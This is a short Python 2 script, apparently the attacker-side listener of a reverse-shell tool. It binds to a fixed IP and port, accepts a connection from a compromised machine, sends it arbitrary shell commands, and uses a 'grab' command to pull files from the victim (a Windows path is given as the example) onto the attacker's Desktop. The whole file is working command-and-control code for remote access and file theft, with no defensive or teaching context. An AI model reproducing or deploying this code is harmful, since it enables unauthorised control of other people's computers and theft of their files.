#Server

import socket       #For building TCP Connection

def transfer(conn,command):
    conn.send(command)
    f=open('/root/Desktop/testfile','wb')
    while True:
        packet=conn.recv(1024)
        if 'Unable to find out the file' in packet:
            print '[-] Unable to find out the file'
            break
        if packet.endswith('DONE'):
            print '[+] Transfer Completed'
            f.close()
            break
        f.write(packet)
    f.close()   

def connect():

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("10.10.10.10",8080))   #Specify the IP address and Port number
    s.listen(1)  #For listening to one connection 
    conn,addr=s.accept()
    print '[+] We got a connection from: ',addr

    while True:
        command=raw_input("Shell> ") 

        if 'terminate' in command:
            conn.send('terminate')
            conn.close() #Close the socket
            break
            
        elif 'grab' in command:
            # grab*C:\Users\file-name.extension
            transfer(conn,command)

        else:
            conn.send(command)  #Send command
            print conn.recv(1024)

def main():
    connect()
main()
